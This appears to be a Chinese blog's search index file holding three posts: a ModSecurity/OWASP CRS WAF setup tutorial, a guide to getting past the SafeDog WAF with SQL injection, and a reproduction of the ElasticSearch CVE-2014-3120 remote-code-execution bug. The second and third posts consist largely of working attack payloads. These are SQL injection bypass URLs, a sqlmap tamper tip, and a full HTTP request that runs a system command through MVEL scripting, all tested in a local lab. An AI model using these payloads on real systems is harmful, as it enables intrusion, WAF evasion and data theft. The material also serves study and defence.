<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[Nginx+ModSecurity实现WAF防护(转载)]]></title>
    <url>%2F2019%2F07%2F05%2Fmodsearcity%2F</url>
    <content type="text"><![CDATA[生活的理想，就是为了理想的生活。 ModSecurity简介ModSecurity是一个入侵侦测与防护引擎，它主要是用于Web应用程序，所以也被称为Web应用程序防火墙(WAF)。它可以作为Web服务器的模块或是单独的应用程序来运作。ModSecurity的功能是增强Web Application 的安全性和保护Web application以避免遭受来自已知与未知的攻击。 ModSecurity计划是从2002年开始，后来由Breach Security Inc.收购，但Breach Security Inc.允诺ModSecurity仍旧为Open Source，并开放源代码给大家使用。最新版的ModSecurity开始支持核心规则集(Core Rule Set)，CRS可用于定义旨在保护Web应用免受0day及其它安全攻击的规则。 ModSecurity还包含了其他一些特性，如并行文本匹配、Geo IP解析和信用卡号检测等，同时还支持内容注入、自动化的规则更新和脚本等内容。此外，它还提供了一个面向Lua语言的新的API，为开发者提供一个脚本平台以实现用于保护Web应用的复杂逻辑。 安装ModSecurity安装依赖包: 1yum install httpd-devel apr apr-util-devel apr-devel pcre pcre-devel libxml2 libxml2-devel zlib zlib-devel openssl openssl-devel 下载nginx和modsearity 12345[root@localhost ~]# cd /opt/#下载modsecurity[root@localhost opt]# wget -O modsecurity-2.9.1.tar.gz https://github.com/SpiderLabs/ModSecurity/releases/download/v2.9.1/modsecurity-2.9.1.tar.gz#下载nginx[root@localhost opt]# wget &apos;http://nginx.org/download/nginx-1.9.2.tar.gz&apos; 编译安装ModSecurityginx加载ModSecurity模块有两种方式:一种是编译为Nginx静态模块，一种是通过ModSecurity-Nginx Connector加载动态模块。 方法一：编译为Nginx静态模块 编译为独立模块(modsecurity-2.9.1) 12345[root@localhost opt]# tar zxvf modsecurity-2.9.1.tar.gz[root@localhost opt]# cd modsecurity-2.9.1/[root@localhost modsecurity-2.9.1]# ./autogen.sh$ [root@localhost modsecurity-2.9.1]# ./configure --enable-standalone-module --disable-mlogc[root@localhost modsecurity-2.9.1]# make 注:如果在运行./autogen.sh的时候系统报错,提示 123456789[root@localhost modsecurity-2.9.1]# ./autogen.sh#如果出现以下情况./autogen.sh:行11: libtoolize: 未找到命令./autogen.sh:行12: autoreconf: 未找到命令./autogen.sh:行13: autoheader: 未找到命令./autogen.sh:行14: automake: 未找到命令./autogen.sh:行15: autoconf: 未找到命令#表示系统未安装这些软件包,我们用yum安装即可[root@localhost modsecurity-2.9.1]# yum install automake autoconf libtool 编译安装Nginx并添加ModSecurity模块 12345[root@localhost opt]# tar xzvf nginx-1.9.2.tar.gz[root@localhost opt]# cd nginx-1.9.2[root@localhost nginx-1.9.2]# ./configure --add-module=/opt/modsecurity-2.9.1/nginx/modsecurity[root@localhost nginx-1.9.2]# make &amp;&amp; make install 方法二：编译通过ModSecurity-Nginx Connector加载的动态模块 编译LibModSecurity(modsecurity-3.0) 12345678$ cd /root$ git clone https://github.com/SpiderLabs/ModSecurity$ cd ModSecurity$ git checkout -b v3/master origin/v3/master$ sh build.sh$ git submodule init$ git submodule update$ ./configure$ make$ make install LibModSecurity会安装在/usr/local/modsecurity/lib目录下。 12$ ls /usr/local/modsecurity/liblibmodsecurity.a libmodsecurity.la libmodsecurity.so libmodsecurity.so.3 libmodsecurity.so.3.0.0 编译安装Nginx并添加ModSecurity-Nginx Connector模块 使用ModSecurity-Nginx模块来连接LibModSecurity 12345$ cd /opt$ git clone https://github.com/SpiderLabs/ModSecurity-nginx.git modsecurity-nginx$ tar xzvf nginx-1.9.2.tar.gz$ cd nginx-1.9.2$ ./configure --add-module=/root/modsecurity-nginx$ make$ make &amp;&amp; make install 添加OWASP规则OWASP CRSOWASP ModSecurity核心规则集（CRS）是一组用于ModSecurity或兼容的Web应用程序防火墙的通用攻击检测规则。CRS旨在保护Web应用程序免受各种攻击，包括OWASP十大攻击，并且只需最少的虚假警报。ModSecurity之所以强大就在于OWASP提供的规则，我们可以根据自己的需求选择不同的规则，也可以通过ModSecurity手工创建安全过滤器、定义攻击并实现主动的安全输入验证。 ModSecurity核心规则集(CRS)提供以下类别的保护来防止攻击。 HTTP Protection(HTTP防御) HTTP协议和本地定义使用的detects violations策略。 Real-time Blacklist Lookups(实时黑名单查询) 利用第三方IP名单。 HTTP Denial of Service Protections(HTTP的拒绝服务保护) 防御HTTP的洪水攻击和HTTP Dos攻击。 Common Web Attacks Protection(常见的Web攻击防护) 检测常见的Web应用程序的安全攻击。 Automation Detection(自动化检测) 检测机器人，爬虫，扫描仪和其他表面恶意活动。 Integration with AV Scanning for File Uploads(文件上传防病毒扫描) 检测通过Web应用程序上传的恶意文件。 Tracking Sensitive Data(跟踪敏感数据) 信用卡通道的使用，并阻止泄漏。 Trojan Protection(木马防护) 检测访问木马。 Identification of Application Defects(应用程序缺陷的鉴定) 检测应用程序的错误配置警报。 Error Detection and Hiding(错误检测和隐藏) 检测伪装服务器发送错误消息。 下载OWASP规则并生成配置文件1234[root@localhost opt]# git clone https://github.com/SpiderLabs/owasp-modsecurity-crs.git[root@localhost opt]# cp -rf owasp-modsecurity-crs /usr/local/nginx/conf/[root@localhost opt]# cd /usr/local/nginx/conf/owasp-modsecurity-crs/[root@localhost owasp-modsecurity-crs]# cp crs-setup.conf.example crs-setup.conf 配置OWASP规则编辑crs-setup.conf文件 1234$ sed -ie &apos;s/SecDefaultAction &quot;phase:1,log,auditlog,pass&quot;/#SecDefaultAction &quot;phase:1,log,auditlog,pass&quot;/g&apos; crs-setup.conf$ sed -ie &apos;s/SecDefaultAction &quot;phase:2,log,auditlog,pass&quot;/#SecDefaultAction &quot;phase:2,log,auditlog,pass&quot;/g&apos; crs-setup.conf$ sed -ie &apos;s/#.*SecDefaultAction &quot;phase:1,log,auditlog,deny,status:403&quot;/SecDefaultAction &quot;phase:1,log,auditlog,deny,status:403&quot;/g&apos; crs-setup.conf$ sed -ie &apos;s/# SecDefaultAction &quot;phase:2,log,auditlog,deny,status:403&quot;/SecDefaultAction &quot;phase:2,log,auditlog,deny,status:403&quot;/g&apos; crs-setup.conf 默认ModSecurity不会阻挡恶意连接，只会记录在Log里。修改SecDefaultAction选项，默认开启阻挡。 启用ModSecurity模块和CRS规则复制ModSecurity源码目录下的modsecurity.conf-recommended和unicode.mapping到Nginx的conf目录下，并将modsecurity.conf-recommended重新命名为modsecurity.conf。 modsecurity.conf-recommended是ModSecurity工作的主配置文件。默认情况下，它带有.recommended扩展名。要初始化ModSecurity，我们就要重命名此文件。 123[root@localhost owasp-modsecurity-crs]# cd /opt/modsecurity-2.9.1/[root@localhost modsecurity-2.9.1]# cp modsecurity.conf-recommended /usr/local/nginx/conf/modsecurity.conf[root@localhost modsecurity-2.9.1]# cp unicode.mapping /usr/local/nginx/conf/ 将SecRuleEngine设置为On，默认值为DetectOnly即为观察模式，建议大家在安装时先默认使用这个模式，规则测试完成后在设置为On，避免出现对网站、服务器某些不可知的影响。 12[root@localhost modsecurity-2.9.1]# vim /usr/local/nginx/conf/modsecurity.conf SecRuleEngine On ModSecurity中几个常用配置说明： 1.SecRuleEngine：是否接受来自ModSecurity-CRS目录下的所有规则的安全规则引擎。因此，我们可以根据需求设置不同的规则。要设置不同的规则有以下几种。SecRuleEngine On：将在服务器上激活ModSecurity防火墙，它会检测并阻止该服务器上的任何恶意攻击。SecRuleEngine Detection Only：如果设置这个规则它只会检测到所有的攻击，并根据攻击产生错误，但它不会在服务器上阻止任何东西。SecRuleEngine Off:这将在服务器上上停用ModSecurity的防火墙。 2.SecRequestBodyAccess：它会告诉ModSecurity是否会检查请求，它起着非常重要的作用。它只有两个参数ON或OFF。 3.SecResponseBodyAccess：如果此参数设置为ON，然后ModeSecurity可以分析服务器响应，并做适当处理。它也有只有两个参数ON和Off，我们可以根据求要进行设置。 4.SecDataDir：定义ModSecurity的工作目录，该目录将作为ModSecurity的临时目录使用。 在owasp-modsecurity-crs/rules下有很多定义好的规则，将需要启用的规则用Include指令添加进来就可以了。 3.x版本CRS 12345$ cd /usr/local/nginx/conf/owasp-modsecurity-crs# 生成例外排除请求的配置文件$ cp rules/REQUEST-900-EXCLUSION-RULES-BEFORE-CRS.conf.example rules/REQUEST-900-EXCLUSION-RULES-BEFORE-CRS.conf$ cp rules/RESPONSE-999-EXCLUSION-RULES-AFTER-CRS.conf.example rules/RESPONSE-999-EXCLUSION-RULES-AFTER-CRS.conf$ cp rules/*.data /usr/local/nginx/conf 为了保持modsecurity.conf简洁，这里新建一个modsec_includes.conf文件,内容为需要启用的规则。 123456789101112131415161718192021222324252627282930vim /usr/local/nginx/conf/modsec_includes.confinclude modsecurity.confinclude owasp-modsecurity-crs/crs-setup.confinclude owasp-modsecurity-crs/rules/REQUEST-900-EXCLUSION-RULES-BEFORE-CRS.confinclude owasp-modsecurity-crs/rules/REQUEST-901-INITIALIZATION.confInclude owasp-modsecurity-crs/rules/REQUEST-903.9002-WORDPRESS-EXCLUSION-RULES.confinclude owasp-modsecurity-crs/rules/REQUEST-905-COMMON-EXCEPTIONS.confinclude owasp-modsecurity-crs/rules/REQUEST-910-IP-REPUTATION.confinclude owasp-modsecurity-crs/rules/REQUEST-911-METHOD-ENFORCEMENT.confinclude owasp-modsecurity-crs/rules/REQUEST-912-DOS-PROTECTION.confinclude owasp-modsecurity-crs/rules/REQUEST-913-SCANNER-DETECTION.confinclude owasp-modsecurity-crs/rules/REQUEST-920-PROTOCOL-ENFORCEMENT.confinclude owasp-modsecurity-crs/rules/REQUEST-921-PROTOCOL-ATTACK.confinclude owasp-modsecurity-crs/rules/REQUEST-930-APPLICATION-ATTACK-LFI.confinclude owasp-modsecurity-crs/rules/REQUEST-931-APPLICATION-ATTACK-RFI.confinclude owasp-modsecurity-crs/rules/REQUEST-932-APPLICATION-ATTACK-RCE.confinclude owasp-modsecurity-crs/rules/REQUEST-933-APPLICATION-ATTACK-PHP.confinclude owasp-modsecurity-crs/rules/REQUEST-941-APPLICATION-ATTACK-XSS.confinclude owasp-modsecurity-crs/rules/REQUEST-942-APPLICATION-ATTACK-SQLI.confinclude owasp-modsecurity-crs/rules/REQUEST-943-APPLICATION-ATTACK-SESSION-FIXATION.confinclude owasp-modsecurity-crs/rules/REQUEST-949-BLOCKING-EVALUATION.confinclude owasp-modsecurity-crs/rules/RESPONSE-950-DATA-LEAKAGES.confinclude owasp-modsecurity-crs/rules/RESPONSE-951-DATA-LEAKAGES-SQL.confinclude owasp-modsecurity-crs/rules/RESPONSE-952-DATA-LEAKAGES-JAVA.confinclude owasp-modsecurity-crs/rules/RESPONSE-953-DATA-LEAKAGES-PHP.confinclude owasp-modsecurity-crs/rules/RESPONSE-954-DATA-LEAKAGES-IIS.confinclude owasp-modsecurity-crs/rules/RESPONSE-959-BLOCKING-EVALUATION.confinclude owasp-modsecurity-crs/rules/RESPONSE-980-CORRELATION.confinclude owasp-modsecurity-crs/rules/RESPONSE-999-EXCLUSION-RULES-AFTER-CRS.conf 注：考虑到可能对主机性能上的损耗，可以根据实际需求加入对应的漏洞的防护规则即可。 配置Nginx支持Modsecurity启用Modsecurity 使用静态模块加载的配置方法 在需要启用Modsecurity的主机的location下面加入下面两行即可： 123456789101112[root@localhost modsecurity-2.9.1]# vim /usr/local/nginx/conf/nginx.conf server &#123; listen 80; server_name localhost; location / &#123; #加入下面两行内容 ModSecurityEnabled on; ModSecurityConfig modsec_includes.conf; root html; index index.html index.htm; &#125; 使用动态模块加载的配置方法 在需要启用Modsecurity的主机的location下面加入下面两行即可： 123456789101112[root@localhost modsecurity-2.9.1]# vim /usr/local/nginx/conf/nginx.confserver &#123; listen 80; server_name localhost; location / &#123; #加入下面两行内容 modsecurity on; modsecurity_rules_file modsec_includes.conf; root html; index index.html index.htm; &#125; 验证Nginx配置文件123[root@localhost modsecurity-2.9.1]# /usr/local/nginx/sbin/nginx -tnginx: [emerg] ModSecurityConfig in /usr/local/nginx/conf/nginx.conf:45: Cannot open config file: /usr/local/nginx/conf/owasp-modsecurity-crs/rules/REQUEST-900-EXCLUSION-RULES-BEFORE-CRS.confnginx: configuration file /usr/local/nginx/conf/nginx.conf test failed 发现没有REQUEST-900-EXCLUSION-RULES-BEFORE-CRS.conf文件,然后去其目录发现存在着REQUEST-900-EXCLUSION-RULES-BEFORE-CRS.conf,所以将其修改名称即可,再次测试,发现RESPONSE-999-EXCLUSION-RULES-AFTER-CRS.conf也是没有的,使用相同的方法修改 12345[root@localhost modsecurity-2.9.1]# cd /usr/local/nginx/conf/owasp-modsecurity-crs/rules/[root@localhost rules]# cp REQUEST-900-EXCLUSION-RULES-BEFORE-CRS.conf.example REQUEST-900-EXCLUSION-RULES-BEFORE-CRS.conf[root@localhost rules]# cp RESPONSE-999-EXCLUSION-RULES-AFTER-CRS.conf.example RESPONSE-999-EXCLUSION-RULES-AFTER-CRS.conf 最后测试成功 123[root@localhost rules]# /usr/local/nginx/sbin/nginx -tnginx: the configuration file /usr/local/nginx/conf/nginx.conf syntax is oknginx: configuration file /usr/local/nginx/conf/nginx.conf test is successful 启动Nginx 1[root@localhost rules]# /usr/local/nginx/sbin/nginx -c /usr/local/nginx/conf/nginx.conf 测试Modsecurity正常访问时ok的 那么我们尝试构造一些注入参数进去试试 其日志保存在/var/log/modsec_audit.log 1234567891011121314151617181920[root@localhost log]# tail -n 20 modsec_audit.log Connection: keep-alive--9621e831-H--Message: Warning. Pattern match &quot;^[\\d.:]+$&quot; at REQUEST_HEADERS:Host. [file &quot;/usr/local/nginx/conf/owasp-modsecurity-crs/rules/REQUEST-920-PROTOCOL-ENFORCEMENT.conf&quot;] [line &quot;682&quot;] [id &quot;920350&quot;] [msg &quot;Host header is a numeric IP address&quot;] [data &quot;192.168.204.129&quot;] [severity &quot;WARNING&quot;] [ver &quot;OWASP_CRS/3.1.0&quot;] [tag &quot;application-multi&quot;] [tag &quot;language-multi&quot;] [tag &quot;platform-multi&quot;] [tag &quot;attack-protocol&quot;] [tag &quot;OWASP_CRS/PROTOCOL_VIOLATION/IP_HOST&quot;] [tag &quot;WASCTC/WASC-21&quot;] [tag &quot;OWASP_TOP_10/A7&quot;] [tag &quot;PCI/6.5.10&quot;]Message: Warning. detected XSS using libinjection. [file &quot;/usr/local/nginx/conf/owasp-modsecurity-crs/rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf&quot;] [line &quot;58&quot;] [id &quot;941100&quot;] [msg &quot;XSS Attack Detected via libinjection&quot;] [data &quot;Matched Data: XSS data found within ARGS:search: &lt;script&gt;alert(/xss/)&lt;/scrity&gt;&quot;] [severity &quot;CRITICAL&quot;] [ver &quot;OWASP_CRS/3.1.0&quot;] [tag &quot;application-multi&quot;] [tag &quot;language-multi&quot;] [tag &quot;platform-multi&quot;] [tag &quot;attack-xss&quot;] [tag &quot;OWASP_CRS/WEB_ATTACK/XSS&quot;] [tag &quot;WASCTC/WASC-8&quot;] [tag &quot;WASCTC/WASC-22&quot;] [tag &quot;OWASP_TOP_10/A3&quot;] [tag &quot;OWASP_AppSensor/IE1&quot;] [tag &quot;CAPEC-242&quot;]Message: Warning. Pattern match &quot;(?i)[&lt;\xef\xbc\x9c]script[^&gt;\xef\xbc\x9e]*[&gt;\xef\xbc\x9e][\\s\\S]*?&quot; at ARGS:search. [file &quot;/usr/local/nginx/conf/owasp-modsecurity-crs/rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf&quot;] [line &quot;88&quot;] [id &quot;941110&quot;] [msg &quot;XSS Filter - Category 1: Script Tag Vector&quot;] [data &quot;Matched Data: &lt;script&gt; found within ARGS:search: &lt;script&gt;alert(/xss/)&lt;/scrity&gt;&quot;] [severity &quot;CRITICAL&quot;] [ver &quot;OWASP_CRS/3.1.0&quot;] [tag &quot;application-multi&quot;] [tag &quot;language-multi&quot;] [tag &quot;platform-multi&quot;] [tag &quot;attack-xss&quot;] [tag &quot;OWASP_CRS/WEB_ATTACK/XSS&quot;] [tag &quot;WASCTC/WASC-8&quot;] [tag &quot;WASCTC/WASC-22&quot;] [tag &quot;OWASP_TOP_10/A3&quot;] [tag &quot;OWASP_AppSensor/IE1&quot;] [tag &quot;CAPEC-242&quot;]Message: Warning. Pattern match &quot;(?i)&lt;[^\\w&lt;&gt;]*(?:[^&lt;&gt;\&quot;&apos;\\s]*:)?[^\\w&lt;&gt;]*(?:\\W*?s\\W*?c\\W*?r\\W*?i\\W*?p\\W*?t|\\W*?f\\W*?o\\W*?r\\W*?m|\\W*?s\\W*?t\\W*?y\\W*?l\\W*?e|\\W*?s\\W*?v\\W*?g|\\W*?m\\W*?a\\W*?r\\W*?q\\W*?u\\W*?e\\W*?e|(?:\\W*?l\\W*?i\\W*?n\\W*?k|\\W*?o\\W*?b\\W*?j\\W*?e\ ...&quot; at ARGS:search. [file &quot;/usr/local/nginx/conf/owasp-modsecurity-crs/rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf&quot;] [line &quot;207&quot;] [id &quot;941160&quot;] [msg &quot;NoScript XSS InjectionChecker: HTML Injection&quot;] [data &quot;Matched Data: &lt;script found within ARGS:search: &lt;script&gt;alert(/xss/)&lt;/scrity&gt;&quot;] [severity &quot;CRITICAL&quot;] [ver &quot;OWASP_CRS/3.1.0&quot;] [tag &quot;application-multi&quot;] [tag &quot;language-multi&quot;] [tag &quot;platform-multi&quot;] [tag &quot;attack-xss&quot;] [tag &quot;OWASP_CRS/WEB_ATTACK/XSS&quot;] [tag &quot;WASCTC/WASC-8&quot;] [tag &quot;WASCTC/WASC-22&quot;] [tag &quot;OWASP_TOP_10/A3&quot;] [tag &quot;OWASP_AppSensor/IE1&quot;] [tag &quot;CAPEC-242&quot;]Message: Access denied with code 403 (phase 2). Operator GE matched 5 at TX:anomaly_score. [file &quot;/usr/local/nginx/conf/owasp-modsecurity-crs/rules/REQUEST-949-BLOCKING-EVALUATION.conf&quot;] [line &quot;91&quot;] [id &quot;949110&quot;] [msg &quot;Inbound Anomaly Score Exceeded (Total Score: 18)&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;application-multi&quot;] [tag &quot;language-multi&quot;] [tag &quot;platform-multi&quot;] [tag &quot;attack-generic&quot;]Message: Warning. Operator GE matched 5 at TX:inbound_anomaly_score. [file &quot;/usr/local/nginx/conf/owasp-modsecurity-crs/rules/RESPONSE-980-CORRELATION.conf&quot;] [line &quot;86&quot;] [id &quot;980130&quot;] [msg &quot;Inbound Anomaly Score Exceeded (Total Inbound Score: 18 - SQLI=0,XSS=15,RFI=0,LFI=0,RCE=0,PHPI=0,HTTP=0,SESS=0): individual paranoia level scores: 18, 0, 0, 0&quot;] [tag &quot;event-correlation&quot;]Message: Audit log: Failed to lock global mutex: Permission deniedAction: Intercepted (phase 2)Apache-Handler: IISStopwatch: 1562335360000217 222381 (- - -)Stopwatch2: 1562335360000217 222381; combined=3851, p1=333, p2=3340, p3=0, p4=0, p5=178, sr=8, sw=0, l=0, gc=0Producer: ModSecurity for nginx (STABLE)/2.9.1 (http://www.modsecurity.org/); OWASP_CRS/3.1.0.Server: ModSecurity StandaloneEngine-Mode: &quot;ENABLED&quot;--9621e831-Z-- 可以查看到其匹配了REQUEST-920-PROTOCOL-ENFORCEMENT.conf和REQUEST-941-APPLICATION-ATTACK-XSS.conf文件中的规则. 参考文档:https://www.hi-linux.com/posts/45920.html]]></content>
      <categories>
        <category>运维技术</category>
      </categories>
      <tags>
        <tag>开源waf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[绕waf系列之绕安全狗]]></title>
    <url>%2F2019%2F07%2F04%2F%E7%BB%95%E5%AE%89%E5%85%A8%E7%8B%97%2F</url>
    <content type="text"><![CDATA[从来不需要想起，永远也不会忘记。 攻击的特定:攻击二象性:已知攻击和未知攻击 目前市面主流的WAF产品:云WAF ​ 阿里云盾 ​ 腾讯网站管家 ​ 创宇盾 ​ ClodeFlare等 软件产品类 安全狗 云锁 360主机卫士 ModSecurity 硬件类型设备: 启明星辰 ​ 绿盟 ​ 天融信 ​ 飞塔等 硬件waf缺陷:对HTTP协议的兼容性不强,对异常报文会产生bug,导致绕过 WAF的核心原理: 运用黑白思想 特征匹配,漏洞签名:特定特征的漏洞,比如stract2漏洞 对匹配结果进行响应(拦截,记录) WAF的几种部署模式基于DNS解析修改DNS,让域名解析到反向代理服务器,所有流量经过反向代理进行检测,检测无问题之后再转发给后端的web服务器 串联模式一般指的是反向代理模式,透明代理模式.反向代理模式会改变原有的网络拓扑,真实客户端ip会以HTTP header传递给后端web server.透明代理模式可以在不改变原有网络拓扑结构的情况下直接部署. 旁路模式利用流量镜像技术,将业务流量分流给WAF产品,这种部署模式的优点是不会影响业务稳定性,所以WAF会投入更多的性能在检出率上面.但是缺点也很明显,不借助其他手段无法对检测出的攻击行为进行阻断. 软件嵌入中间件+检测引擎模式在使用nginx作为反向代理的业务中,WAF提高nginx模块嵌入原有nginx,将请求转发给检测引擎,可以做到在不改动原有的网络拓扑的情况下完成检测任务 WAF为什么会被绕过:1.鱼(安全)和熊掌(业务性能)不能兼得,waf需要满足基本业务需求,所以一般不设置白名单之类的过于苛刻的操作 2.WAF为了考虑通用性的问题,无法100%覆盖某些语言,中间件,数据库等特性 3.硬件WAF自身往往存在漏洞 架构:waf部署模式 规则缺陷/特性 协议:指HTTP0.9协议:TCP长连接 WAF绕过实战—-绕过安全狗进行注入所谓的bypass waf实际上是去寻找位于waf设备之后处理应用层数据包的硬件/软件的特性,利用特性构造waf不能命中,但是在应用程序能够执行成功的payload,绕过防护 实验环境:环境:安全狗Apache最新版(http://download.safedog.cn/download/software/safedogwzApache.exe)+phpstudy+windows系统 本地测试代码: 12345678910111213&lt;?php$id = $_GET[&apos;id&apos;];$con = mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;);if (!$con)&#123;die(&apos;Could not connect: &apos; . mysql_error());&#125;mysql_select_db(&quot;dvwa&quot;, $con);$query = &quot;SELECT first_name,last_name FROM users WHERE user_id = &apos;$id&apos;; &quot;;$result = mysql_query($query)or die(&apos;&lt;pre&gt;&apos;.mysql_error().&apos;&lt;/pre&gt;&apos;);while($row = mysql_fetch_array($result))&#123; echo $row[&apos;0&apos;] . &quot;&amp;nbsp&quot; . $row[&apos;1&apos;]; echo &quot;&lt;br /&gt;&quot;;&#125;echo &quot;&lt;br/&gt;&quot;;echo $query;mysql_close($con);?&gt; 绕过拦截and 1=1首先先稍微测试一番,发现存在安全狗 1http://127.0.0.1/test.php?id=1 and 1=1%23 12345678and 1 拦截and &apos;1&apos; 拦截 and a 不拦截 and &apos;a&apos; 拦截 and ! 不拦截 and 1+1 拦截 and 1+a 拦截 and hex(1) 不拦截 通过测试我们发现当 and 后面跟上 数字型和字符型时他会给我们拦截掉 ，其实我们在安全狗的规则里面可以看到他拦截 and 和 or 所以我们有2个思路 用其他字符替换 and 或者 or 带入的不是字符串和数字型，带入一个特殊符号 针对第一种我们可以去看看运算符号 随便找到几个| ^ xor &amp; / * &amp;&amp; || 等等还有很多 123与运算 a &amp; b , 或运算 a | b , 异或运算 a ^ b 那么可以试着将and替换成&amp;&amp;,URL编码得到%26%26,将1=1替换成true或者false,发现可以成功绕过 1http://127.0.0.1/test.php?id=1&apos; %26%26 true%23 另外在分享一些可以绕过目前版本的安全狗测试payload,(注:mysql支持&amp;&amp; || ,oracle不支持 &amp;&amp; ||） 12345http://127.0.0.1/test.php?id=1&apos; || true%23 //将and 1=1替换为|| true,也可以绕过安全狗http://127.0.0.1/test.php?id=1&apos; ||(1) %23 //使用括号代替空格绕过//异或逻辑运算符xor，运算法则是：两个条件相同（同真或同假）即为假（0），两个条件不同即为真（1）http://127.0.0.1/test.php?id=1&apos; xor 1%23 http://127.0.0.1/test.php?id=1&apos; xor true%23 绕过order by查询判断查询字段,使用mysql的/*!*/ 内敛注释去绕过防护,而其中的代码是可以正常执行的 1http://127.0.0.1/test.php?id=1&apos; /*!order*//*!by*/2%23 绕过union select查询使用union xxx页面正常, 但是用union和select放在在一起就被发现啦 在网上找了好一阵子,发现有大佬提供的payload使用正则表达式去绕过 1http://127.0.0.1/test.php?id=1&apos;=/*!user () regexp 0x5e72*/--+ 对于数字型注入,可以将其转换成浮点型 联合查询绕waf,%0a为换行符经过URL编码得到的,可以通过换行符进行绕过, 函数中可以插入任何混淆字符绕过waf 另外使用-1可以省去空格绕过waf 1http://127.0.0.1/test.php?id=1.0 /*union/*!select-1*/,user--%0a()%23 基于报错信息的注入绕安全狗 12http://127.0.0.1/test.php?id=1&apos; and /*!12345updatexml!*/(1,concat(0x7e,version()))%23http://127.0.0.1/test.php?id=1&apos; and /*!12345extractvalue!*/(1,concat(0x7e,version()))%23 绕过select from使用大括号去绕过 1http://127.0.0.1/test.php?id=1.0 /*union/*!select-1*/,2,3,4From&#123;information_schema.tables&#125; 使用反引号去绕过 1http://127.0.0.1/test.php?id=1.0 /*union/*!select-1*/,2,3,4 From`information_schema.tables` 使用\N去绕过 1http://127.0.0.1/test.php?id=1.0 /*union/*!select-1*/,2,3,\Nfrom information_schema.tables 括号法去绕过 1http://127.0.0.1/test.php?id=1.0 /*union/*!select-1*/,2,3,From(((information_schema.tables))) 也可以组合起来 1http://127.0.0.1/test.php?id=1.0 /*union/*!select-1*/,2,3,4\Nfrom&#123;a`information_schema`.tables&#125; 这些都是去掉空格的合法语句,当然如果不拦截/*/或/!*/的话,也可以尝试这两个 提示，安全狗默认不开启对information_schema的拦截，如果开启了，那么就得找支持post传递数据的注入点了，post下不拦截information_schema这个关键词。 补充点 php+mysql环境下支持的空格有： 1%0a,%0b,%0c,%0d,%20,%09,%a0,/**/ 其中使用的最多的就是%0a,%0b,%a0,/**/，这四个当作空格插入在语句中来扰乱waf检测。 干货分享：使用/^!$asd%2a–=/代替空格即可，找到sqlmap中tamper目录下的space2plus.py文件，将其中代替空格的/*/换成/^!$asd%2a–=*/即可使用sqlmap跑了。 缓冲区溢出绕waf另外也可以对安全狗实行缓冲区溢出绕waf 缓冲区溢出用于对WAF，有不少WAF是C写的，而C语言本身没有缓冲区保护机制，因此如果WAF在处理测试量时超出其缓冲区长度，就会引发bug从而实现绕过 要求是(针对于安全狗而已): ​ GET类型请求转换成POST类型 ​ Content-Length头长度大于4008 ​ 正常参数放置在脏数据后面]]></content>
      <categories>
        <category>绕waf</category>
      </categories>
      <tags>
        <tag>绕安全狗</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ElasticSearch命令执行漏洞复现]]></title>
    <url>%2F2019%2F07%2F03%2Felasticsearch%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[只有自己强大优秀，面对真挚的感情时才不会唯唯诺诺。 ElasticSearch 命令执行漏洞（CVE-2014-3120）漏洞简介:Elasticsearch是一个高度可扩展的开源全文搜索和分析引擎。它允许您快速，近实时地存储，搜索和分析大量数据。它通常用作底层引擎/技术，为具有复杂搜索功能和要求的应用程序提供支持。 ElasticSearch其有脚本执行(scripting)的功能，可以很方便地对查询出来的数据再加工处理。但其用的脚本引擎是MVEL，这个引擎没有做任何的防护，或者沙盒包装，所以直接可以执行任意代码。 而在ElasticSearch里，默认配置是打开动态脚本功能的，因此用户可以直接通过http请求，执行任意代码。 其实官方是清楚这个漏洞的，在文档里有说明： 123First, you should not run Elasticsearch as the root user, as this would allow a script to access or do anything on your server, without limitations. Second, you should not expose Elasticsearch directly to users, but instead have a proxy application inbetween.首先,不应以 root 用户身份运行 Elasticsearch,因为这将允许脚本访问或执行服务器上的任何操作,不受限制。其次,不应直接向用户公开弹性搜索,而应在中间有一个代理应用程序。 MVEL执行命令的代码如下： 12import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(&quot;id&quot;).getInputStream()).useDelimiter(&quot;\\A&quot;).next(); 影响版本:ElasticSearch 1.2及其之前的版本 漏洞复现:首先判断其目标系统存在elasticsearch,其版本为1.1.1 12345678910111213[root@localhost ~]# curl http://192.168.15.130:9200&#123; &quot;status&quot; : 200, &quot;name&quot; : &quot;Jack of Hearts&quot;, &quot;version&quot; : &#123; &quot;number&quot; : &quot;1.1.1&quot;, &quot;build_hash&quot; : &quot;f1585f096d3f3985e73456debdc1a0745f512bbc&quot;, &quot;build_timestamp&quot; : &quot;2014-04-16T14:27:12Z&quot;, &quot;build_snapshot&quot; : false, &quot;lucene_version&quot; : &quot;4.7&quot; &#125;, &quot;tagline&quot; : &quot;You Know, for Search&quot;&#125; 因为该漏洞需要es中至少存在一条数据，所以我们需要先创建一条数据： 123456789101112POST /website/blog/ HTTP/1.1Host: 192.168.15.130:9200Accept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 25&#123; &quot;name&quot;: &quot;phithon&quot;&#125; 然后，插入payload去执行代码： 12345678910111213141516171819202122232425POST /_search?pretty HTTP/1.1Host: 192.168.15.130:9200Accept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 343&#123; &quot;size&quot;: 1, &quot;query&quot;: &#123; &quot;filtered&quot;: &#123; &quot;query&quot;: &#123; &quot;match_all&quot;: &#123; &#125; &#125; &#125; &#125;, &quot;script_fields&quot;: &#123; &quot;command&quot;: &#123; &quot;script&quot;: &quot;import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\&quot;id\&quot;).getInputStream()).useDelimiter(\&quot;\\\\A\&quot;).next();&quot; &#125; &#125;&#125; 修复方法1.关掉执行脚本功能，在配置文件elasticsearch.yml里为每一个结点都加上： 1script.disable_dynamic: true 